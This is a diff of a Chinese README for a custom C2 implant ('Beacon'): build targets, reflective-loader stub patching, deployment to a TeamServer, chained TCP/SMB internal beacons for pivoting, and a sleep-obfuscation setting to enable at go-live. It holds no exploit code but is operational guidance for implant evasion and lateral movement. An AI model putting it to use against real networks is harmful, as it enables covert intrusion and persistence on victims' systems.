@@ -1,7 +1,5 @@
 # Beacon 构建与 Reflective Stub Patch
 
-语言：中文 | [English](README.en.md)
-
 ## 环境要求
 
 在其他机器上构建本项目，需要先安装下面的环境。
@@ -15,11 +13,11 @@
 | MSVC C++ 工具集 | VS 安装器中随 C++ 工作负载安装，例如 v143 / v142 |
 | Windows 10 SDK 或 Windows 11 SDK | 项目使用 Windows API 构建，VS 安装器中勾选即可 |
 
-### Patch 阶段需要
+### Patch 阶段需要（可选）
 
 | 依赖 | 说明 |
 |------|------|
-| Go 1.21+ | 用于运行 `tools\patch_reflective_stub`，生成 patched reflective stub |
+| Go 1.21+ | 仅在从源码运行 patch 工具时需要；已有预编译的 `PatchBeacon.exe` |
 
 ### Visual Studio 安装建议
 
@@ -66,14 +64,63 @@ x86\Release\Beacon_x86.dll
 x86\ReleaseExe\beacon_windows_x86.exe
 ```
 
-所有产物需部署到 TeamServer 的 `static\beacon_templates` 目录下：
+Internal 级联模板产物目录：
 
 ```text
-static\beacon_templates\
+x64\ReleaseExeTcpInternal\beacon_tcp_internal_amd64.exe
+x64\ReleaseExeSmbInternal\beacon_smb_internal_amd64.exe
+x86\ReleaseExeTcpInternal\beacon_tcp_internal_x86.exe
+x86\ReleaseExeSmbInternal\beacon_smb_internal_x86.exe
+```
+
+所有产物需部署到 TeamServer 的 `static\beacon_templates\C-Beacon` 目录下：
+
+```text
+static\beacon_templates\C-Beacon\
+├── beacon_windows_amd64.dll        ← patched reflective DLL
+├── beacon_windows_x86.dll          ← patched reflective DLL
 ├── beacon_windows_amd64.exe
 ├── beacon_windows_x86.exe
-├── stager_windows_amd64.bin    ← patch 后生成
-└── stager_windows_32.bin       ← patch 后生成
+├── beacon_tcp_internal_amd64.exe
+├── beacon_tcp_internal_x86.exe
+├── beacon_smb_internal_amd64.exe
+└── beacon_smb_internal_x86.exe
+```
+
+### 同步部署
+
+项目提供 `sync_teamserver_templates.bat` 脚本（本地使用，不纳入版本管理），自动完成 build → patch DLL → 复制全部产物到 `C-Beacon`：
+
+```bat
+sync_teamserver_templates.bat
+```
+
+默认 TeamServer 路径为 `..\..\..\go\TeamServer`（即 `D:\代码\go\TeamServer`）。如果 TeamServer 在其他位置，可传入路径：
+
+```bat
+sync_teamserver_templates.bat E:\other\TeamServer
+```
+
+脚本流程：
+1. 调用 `build_all.bat` 构建全部 8 个目标
+2. 使用 `PatchBeacon.exe` 对 x64/x86 DLL 打 reflective stub 补丁
+3. 复制 8 个产物（2 patched DLL + 2 EXE + 4 internal EXE）到 `C-Beacon`
+
+### 级联使用概要
+
+- HTTP/HTTPS Beacon 是 external 入口，继续通过 TeamServer 心跳。
+- TCP internal Beacon 启动后监听配置中的 `bind_host:bind_port`，父 Beacon 使用 `connect` 命令主动连接。
+- SMB internal Beacon 启动后监听配置中的 named pipe，父 Beacon 使用 `link` 命令连接。
+- internal TCP/SMB Beacon 与父 Beacon 断开后会重新进入监听/等待连接状态；如果收到 `exit` 导致 Beacon 退出，则不会重听。
+- 给 internal child 下发普通命令时，前端仍然选择 child Beacon；TeamServer 会自动把任务包装成 `cascade_route` 并交给 gateway/parent 转发。
+
+常见链路：
+
+```text
+TeamServer <--HTTP--> A
+TeamServer <--HTTP--> A --TCP--> B
+TeamServer <--HTTP--> A --SMB--> B
+TeamServer <--HTTP--> A --TCP--> B --SMB--> C
 ```
 
 ## Patch DLL Reflective Stub
@@ -84,22 +131,23 @@ static\beacon_templates\
 tools\patch_reflective_stub
 ```
 
-该工具会自动识别 DLL 架构：
+该工具会自动识别 DLL 架构并生成对应的 DOS-head reflective stub：
 
-- `x64\Release\Beacon_amd64.dll` → 生成 x64 DOS-head reflective stub
-- `x86\Release\Beacon_x86.dll` → 生成 x86 DOS-head reflective stub
+- `x64\Release\Beacon_amd64.dll` → x64 stub
+- `x86\Release\Beacon_x86.dll` → x86 stub
 
-### x64 DLL
+### 使用预编译工具
+
+```bat
+tools\patch_reflective_stub\PatchBeacon.exe x64\Release\Beacon_amd64.dll x64\Release\beacon_windows_amd64.dll REFLoader
+tools\patch_reflective_stub\PatchBeacon.exe x86\Release\Beacon_x86.dll x86\Release\beacon_windows_x86.dll REFLoader
+```
+
+### 从源码运行（需要 Go 1.21+）
 
 ```bat
 cd tools\patch_reflective_stub
 go run . "..\..\x64\Release\Beacon_amd64.dll" "..\..\beacon_windows_amd64.dll" REFLoader
-```
-
-### x86 DLL
-
-```bat
-cd tools\patch_reflective_stub
 go run . "..\..\x86\Release\Beacon_x86.dll" "..\..\beacon_windows_x86.dll" REFLoader
 ```
 
@@ -109,7 +157,7 @@ go run . "..\..\x86\Release\Beacon_x86.dll" "..\..\beacon_windows_x86.dll" REFLo
 - x86 DLL 若找不到 `REFLoader`，工具会自动 fallback 查找 `_REFLoader@4`。
 - 当前 reflective stub patch 只支持 DLL，不支持 EXE。
 - x86 patched blob 需要在 x86/WOW64 进程中执行。
-- 生成的 `stager_windows_amd64.bin` 和 `stager_windows_32.bin` 需部署到 TeamServer 的 `static\beacon_templates` 目录下。
+- patched DLL 输出到第二个参数指定的路径，`sync_teamserver_templates.bat` 会自动完成 patch 并复制到 `C-Beacon`。
 
 ## DebugExe 用法
 
@@ -132,12 +180,12 @@ DebugExe 是独立运行的调试版本，用于验证功能和添加新功能�
 
 ### 关闭睡眠混淆
 
-调试时应确保睡眠混淆处于关闭状态（默认已关闭），避免影响断点调试：
+调试时建议关闭睡眠混淆，避免影响断点调试：
 
 ```c
-// profile.c 第 383-385 行
+// profile.c ProfileLoad()
 //p->sleep_obf_enabled = TRUE;   // 启用
-p->sleep_obf_enabled = FALSE;    // 关闭（默认值）
+p->sleep_obf_enabled = FALSE;    // 默认关闭（调试时保持关闭，上线时改为 TRUE）
 p->sleep_obf_technique = SLEEP_OBF_ZILEAN;
 ```
 
